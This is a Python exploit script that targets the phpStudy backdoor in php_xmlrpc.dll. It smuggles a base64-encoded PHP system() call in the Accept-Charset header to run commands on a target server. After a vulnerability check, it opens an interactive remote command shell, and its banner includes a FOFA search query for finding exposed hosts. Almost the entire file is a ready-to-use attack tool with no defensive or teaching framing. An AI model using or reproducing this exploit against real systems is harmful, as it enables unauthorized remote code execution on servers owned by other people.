#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/5/12
# @Github  : https://github.com/Cr4y0nXX

import base64
import requests
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.parseURL()
        print("timeout:", self.args.timeout)
        self.hasVuln = False
        self.attack()

    def banner(self):
        logo = r"""
           _           _____ _             _      ______  _____  _____ 
          | |         /  ___| |           | |     | ___ \/  __ \|  ___|
     _ __ | |__  _ __ \ `--.| |_ _   _  __| |_   _| |_/ /| /  \/| |__  
    | '_ \| '_ \| '_ \ `--. \ __| | | |/ _` | | | |    / | |    |  __| 
    | |_) | | | | |_) /\__/ / |_| |_| | (_| | |_| | |\ \ | \__/\| |___ 
    | .__/|_| |_| .__/\____/ \__|\__,_|\__,_|\__, \_| \_| \____/\____/   EXP
    | |         | |                           __/ |                    
    |_|         |_|                          |___/            Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | phpStudy任意命令执行漏洞（后门事件）
| 漏洞时间 | 2018-12-？
| 影响版本 | phpstudy 2016版PHP5.4，phpstudy2018版php-5.2.17和php-5.4.45
| 漏洞文件 | php_xmlrpc.dll
| 默认路径 | */php/php-*/ext/php_xmlrpc.dll
| FOFA语句 | app="phpstudy探针"
|-------------------------------------------------
| 脚本功能 | 执行任意系统命令
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def parseArgs(self):
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=True, type=str, help=f"The target address, (ip:port) or url")
        parser.add_argument("-t", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        return parser.parse_args()

    # 处理URL格式
    def parseURL(self):
        self.url = self.args.url
        if "https://" in self.url:
            self.url = self.url.replace("https://", "http://")
        if "http://" not in self.url:
            self.url = f"http://{self.url}"

    # 验证漏洞
    def verify(self, url):
        cmd = "echo ctx1ytxamszdj"
        repData = self.exploitVuln(url, cmd)
        if "ctx1ytxamszdj" in repData:
            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
            self.hasVuln = True
        elif "Conn" == repData:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        else:
            msg = f"[-] [ Safe ]  {url}"
        print(msg)

    # 利用漏洞 执行命令
    def exploitVuln(self, url, cmd):
        reqURL = url
        payload = f"system('{cmd}');"
        payloadBase64 = base64.b64encode(payload.encode()).decode()
        headers = {
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "accept-charset": payloadBase64,
            "Accept-Encoding": "gzip,deflate",
            "Connection": "close",
        }
        try:
            rep = requests.get(url=reqURL, headers=headers, timeout=self.args.timeout, verify=False)
        except:
            return "Conn"
        repData = rep.text.strip()
        try:
            cmdResult = repData[:repData.index("<!DOCTYPE")]
            return cmdResult
        except:
            return "ServerTypeError"

    # 攻击
    def attack(self):
        self.verify(self.url)
        if self.hasVuln:
            while True:
                try:
                    cmd = input("\033[42m" + "Input CMD>" + "\033[0m" + " ")
                    resultData = self.exploitVuln(self.url, cmd)
                    if "ServerTypeError" == resultData:
                        print("\nServerTypeError. Only 'phpStudy探针' pages are supported.\n")
                    else:
                        print("\n", resultData.strip(), "\n")
                except KeyboardInterrupt:
                    print("\n\nBye~\n")
                    return
                except:
                    print("\nError.\n")
        else:
            pass

if __name__ == "__main__":
    EXP()


